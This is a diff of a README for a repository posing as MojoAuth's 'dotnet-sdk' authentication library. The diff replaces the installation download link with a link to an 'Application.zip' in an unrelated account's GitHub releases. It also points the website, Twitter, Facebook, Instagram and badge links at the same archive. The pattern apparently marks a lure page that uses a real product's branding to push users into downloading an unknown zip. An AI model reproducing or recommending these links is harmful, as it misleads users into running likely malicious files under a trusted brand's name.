@@ -17,7 +17,7 @@ Welcome to the "dotnet-sdk" repository, your one-stop solution for implementing 
 ## Installation
 
 To get started, you can download the SDK from the following link:
-[Launch SDK Download](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Launch SDK Download](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)
 
 ## Usage
 
@@ -51,15 +51,15 @@ We welcome contributions from the community to enhance the functionality and fea
 
 Connect with us on social media to stay updated on the latest releases, features, and news related to the "dotnet-sdk" repository:
 
-🌐 Website: [MojoAuth](https://www.mojoauth.com)  
-🐦 Twitter: [@MojoAuth](https://twitter.com/MojoAuth)  
-📘 Facebook: [MojoAuth](https://www.facebook.com/MojoAuth)  
-📸 Instagram: [MojoAuth](https://www.instagram.com/MojoAuth)
+🌐 Website: [MojoAuth](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)  
+🐦 Twitter: [@MojoAuth](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)  
+📘 Facebook: [MojoAuth](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)  
+📸 Instagram: [MojoAuth](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)
 
 ## Spread the Word
 
 If you find the "dotnet-sdk" repository helpful, don't forget to give us a ⭐️ on GitHub and share it with your network. Your support and feedback are greatly appreciated!
 
-[![Download SDK](https://img.shields.io/badge/Download-SDK-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download SDK](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)](https://github.com/Rip257/dotnet-sdk/releases/download/v1.0/Application.zip)
 
 Thank you for choosing the "dotnet-sdk" repository for your authentication needs! 🔐✨🚀
